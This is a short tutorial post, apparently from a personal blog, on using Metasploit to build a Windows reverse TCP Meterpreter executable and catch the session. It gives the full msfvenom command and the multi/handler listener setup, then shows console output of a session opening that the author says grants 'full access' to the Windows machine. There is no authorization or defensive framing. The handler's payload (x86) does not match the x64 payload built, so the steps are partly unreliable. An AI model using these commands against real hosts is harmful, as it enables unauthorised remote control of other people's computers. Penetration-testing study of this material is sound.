---
title: 🐞 Metasploit - Generate Reverse TCP payload for Windows Host
summary: 🐞
date: 2022-02-05

# Featured image
# Place an image named `featured.jpg/png` in this page's folder and customize its options here.
image:
  caption: 'Image credit: [**Metasploit**](https://www.metasploit.com)'

authors:
  - admin

tags:
  - Metasploit
---

Let's get started. First our main setup is Kali Linux. Open up the terminal and run the command.


```shell
ifconfig
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=HOST_IP_ADDRESS LPORT=5555 -f exe -o run.exe
```


Change __HOST_IP_ADDRESS__ to the host IP address that you get from _ifconfig_.
In the _eth0_ section look for _inet_. You can have the same as mine, or something else with a different name, depending if you are on connected wired or wireless.

An example of a Local IP Address could be the following.
```shell
192.168.1.120
```

Now, let's open up the terminal and run _msfconsole_ in order to start up the listener.

```shell
msfconsole
```

_What is msfconsole?_

_"The msfconsole is probably the most popular interface to the Metasploit Framework (MSF). It provides an “all-in-one” centralized console and allows you efficient access to virtually all of the options available in the MSF. MSFconsole may seem intimidating at first, but once you learn the syntax of the commands you will learn to appreciate the power of utilizing this interface."_

```shell
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.120
set LPORT 5555
run
```

Now, we are listening for incoming connections. Move _run.exe_ to a Windows host machine and run it. A Meterpreter session will open, giving full access to the Windows machine.


```shell
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.1.120:5555 
[*] Sending stage (175686 bytes) to 192.168.1.50
[*] Meterpreter session 1 opened (192.168.1.120:5555 -> 192.168.1.50:1042) at 2023-05-31 08:16:15 -0400

meterpreter >
```